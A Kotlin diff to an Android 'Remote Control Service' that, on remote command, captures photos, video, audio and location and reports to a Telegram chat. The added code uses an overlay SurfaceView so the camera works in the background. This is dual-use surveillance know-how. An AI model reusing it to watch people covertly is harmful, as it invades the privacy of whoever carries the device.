@@ -9,26 +9,22 @@ import android.os.*
 import android.util.Log
 import android.view.SurfaceHolder
 import android.view.View
+import android.widget.FrameLayout
+import android.view.SurfaceView
 import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
 import android.content.pm.ServiceInfo
 
-object ServiceHolder {
-    var surfaceHolder: SurfaceHolder? = null
-    var overlaySurfaceView: View? = null
-    var overlayView: View? = null
-    var isRunning: Boolean = false
-}
-
 class ForegroundActionService : Service() {
     private var job: Job? = null
+    private var overlayView: View? = null
+    private var surfaceHolder: SurfaceHolder? = null
 
     override fun onCreate() {
         super.onCreate()
         Log.d("ForegroundActionService", "onCreate called")
-        ServiceHolder.isRunning = true
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -38,9 +34,41 @@ class ForegroundActionService : Service() {
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
             try {
+                if (action == "photo" || action == "video") {
+                    // Show overlay and wait for SurfaceHolder to be ready
+                    val holder = CompletableDeferred<SurfaceHolder?>()
+                    withContext(Dispatchers.Main) {
+                        OverlayHelper.showSurfaceOverlay(this@ForegroundActionService) { holderReady, overlay ->
+                            overlayView = overlay
+                            // Sometimes SurfaceHolder is not ready immediately; wait for surfaceCreated if needed
+                            if (holderReady?.surface?.isValid == true) {
+                                holder.complete(holderReady)
+                            } else if (overlay is FrameLayout && overlay.childCount > 0 && overlay.getChildAt(0) is SurfaceView) {
+                                val sv = overlay.getChildAt(0) as SurfaceView
+                                sv.holder.addCallback(object : SurfaceHolder.Callback {
+                                    override fun surfaceCreated(sh: SurfaceHolder) {
+                                        holder.complete(sh)
+                                    }
+                                    override fun surfaceChanged(sh: SurfaceHolder, f: Int, w: Int, h: Int) {}
+                                    override fun surfaceDestroyed(sh: SurfaceHolder) {}
+                                })
+                            } else {
+                                holder.complete(null)
+                            }
+                        }
+                    }
+                    surfaceHolder = withTimeoutOrNull(2000) { holder.await() }
+                    if (surfaceHolder == null) {
+                        Log.e("ForegroundActionService", "SurfaceHolder not ready, cannot proceed.")
+                        cleanupAndStop()
+                        return@launch
+                    }
+                }
+
                 withContext(Dispatchers.Main) {
                     showNotificationForAction(action)
                 }
+
                 when (action) {
                     "photo" -> handleCameraAction("photo", intent, chatId)
                     "video" -> handleCameraAction("video", intent, chatId)
@@ -57,18 +85,7 @@ class ForegroundActionService : Service() {
                     UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $action: ${formatDateTime(System.currentTimeMillis())}.")
                 }
             } finally {
-                // Overlay removal: always remove overlays here after job is finished, for all actions
-                if (Build.VERSION.SDK_INT >= 34) {
-                    try {
-                        ServiceHolder.overlaySurfaceView?.let { OverlayHelper.removeOverlay(this@ForegroundActionService, it) }
-                        ServiceHolder.overlayView?.let { OverlayHelper.removeOverlay(this@ForegroundActionService, it) }
-                    } catch (_: Exception) {}
-                    ServiceHolder.surfaceHolder = null
-                    ServiceHolder.overlaySurfaceView = null
-                    ServiceHolder.overlayView = null
-                }
-                ServiceHolder.isRunning = false
-                stopSelf()
+                cleanupAndStop()
             }
         }
         return START_NOT_STICKY
@@ -81,15 +98,15 @@ class ForegroundActionService : Service() {
         val duration = intent?.getIntExtra("duration", 60) ?: 60
         val outputFile = File(cacheDir, generateFileName(type, quality))
         val actionTimestamp = System.currentTimeMillis()
-        val surfaceHolder = ServiceHolder.surfaceHolder
-        if (surfaceHolder == null) {
+        val holder = surfaceHolder
+        if (holder == null) {
             Log.e("ForegroundActionService", "SurfaceHolder is null for $type")
             return
         }
         val result: Boolean = try {
             CameraBackgroundHelper.takePhotoOrVideo(
                 context = this,
-                surfaceHolder = surfaceHolder,
+                surfaceHolder = holder,
                 type = type,
                 cameraFacing = cameraFacing,
                 flash = flash,
@@ -190,22 +207,22 @@ class ForegroundActionService : Service() {
 
     override fun onDestroy() {
         job?.cancel()
+        cleanupAndStop()
+        super.onDestroy()
+    }
+
+    private fun cleanupAndStop() {
         if (Build.VERSION.SDK_INT >= 34) {
             try {
-                ServiceHolder.overlaySurfaceView?.let { OverlayHelper.removeOverlay(this, it) }
-                ServiceHolder.overlayView?.let { OverlayHelper.removeOverlay(this, it) }
+                overlayView?.let { OverlayHelper.removeOverlay(this, it) }
             } catch (_: Exception) {}
-            ServiceHolder.surfaceHolder = null
-            ServiceHolder.overlaySurfaceView = null
-            ServiceHolder.overlayView = null
+            surfaceHolder = null
+            overlayView = null
         }
-        ServiceHolder.isRunning = false
-        super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    // Only pass FGS type for camera/audio/location, for others (ring/vibrate/unknown) pass no type!
     private fun showNotificationForAction(action: String) {
         val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
             .setContentTitle("Remote Control Service")
@@ -224,19 +241,11 @@ class ForegroundActionService : Service() {
                 startForeground(1, notification, type)
             } catch (e: SecurityException) {
                 Log.e("ForegroundActionService", "SecurityException: ${e.message}")
-                try {
-                    ServiceHolder.overlaySurfaceView?.let { OverlayHelper.removeOverlay(this, it) }
-                    ServiceHolder.overlayView?.let { OverlayHelper.removeOverlay(this, it) }
-                } catch (_: Exception) {}
-                ServiceHolder.surfaceHolder = null
-                ServiceHolder.overlaySurfaceView = null
-                ServiceHolder.overlayView = null
-                ServiceHolder.isRunning = false
+                cleanupAndStop()
                 stopSelf()
                 return
             }
         } else {
-            // For ring, vibrate, and others, do NOT pass a foreground type!
             startForeground(1, notification)
         }
     }
@@ -253,15 +262,13 @@ class ForegroundActionService : Service() {
         fun stop(context: Context) {
             context.stopService(Intent(context, ForegroundActionService::class.java))
         }
-        fun isRunning(context: Context): Boolean = ServiceHolder.isRunning
+        fun isRunning(context: Context): Boolean = false // Not used in this pattern
 
         fun startCameraAction(
             context: Context,
             type: String,
             options: JSONObject,
-            chatId: String?,
-            surfaceHolder: SurfaceHolder? = null,
-            overlaySurfaceView: View? = null
+            chatId: String?
         ) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", type)
@@ -272,52 +279,46 @@ class ForegroundActionService : Service() {
                 if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
             }
             chatId?.let { intent.putExtra("chat_id", it) }
-            ServiceHolder.surfaceHolder = surfaceHolder
-            ServiceHolder.overlaySurfaceView = overlaySurfaceView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startAudioAction(context: Context, options: JSONObject, chatId: String?, overlayView: View? = null) {
+        fun startAudioAction(context: Context, options: JSONObject, chatId: String?) {
             val duration = options.optInt("duration", 60)
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "audio")
             intent.putExtra("duration", duration)
             chatId?.let { intent.putExtra("chat_id", it) }
-            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startLocationAction(context: Context, chatId: String?, overlayView: View? = null) {
+        fun startLocationAction(context: Context, chatId: String?) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "location")
             chatId?.let { intent.putExtra("chat_id", it) }
-            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startRingAction(context: Context, options: JSONObject, overlayView: View? = null) {
+        fun startRingAction(context: Context, options: JSONObject) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "ring")
-            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startVibrateAction(context: Context, options: JSONObject, overlayView: View? = null) {
+        fun startVibrateAction(context: Context, options: JSONObject) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "vibrate")
-            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
